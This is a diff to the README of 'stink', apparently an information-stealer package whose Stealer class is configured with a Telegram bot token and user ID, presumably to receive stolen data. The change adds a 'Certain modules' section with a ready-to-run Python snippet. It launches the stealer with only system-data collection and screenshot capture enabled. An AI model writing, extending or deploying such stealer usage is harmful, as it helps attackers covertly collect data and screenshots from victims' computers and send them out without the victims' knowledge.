@@ -9,6 +9,7 @@ The `stink` already has an impressive functionality that will only expand.
 * [Current features](#Сurrent-features)
 * [Example usage](#Example-usage)
   * [Standard](#Standard)
+  * [Certain modules](#Certain-modules)
   * [Additional parameters](#Additional-parameters)
 * [Telegram bot setup](#Telegram-bot-setup)
   * [Getting token](#Getting-token)
@@ -52,6 +53,16 @@ from stink import Stealer
 
 if __name__ == '__main__':
     Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+```
+### Certain modules
+
+An example with only system data collection and screenshot.
+```python
+from stink import Stealer
+from stink.enums import Features
+
+if __name__ == '__main__':
+    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID, features=[Features.system, Features.screenshot]).run()
 ```
 ### Additional parameters
 
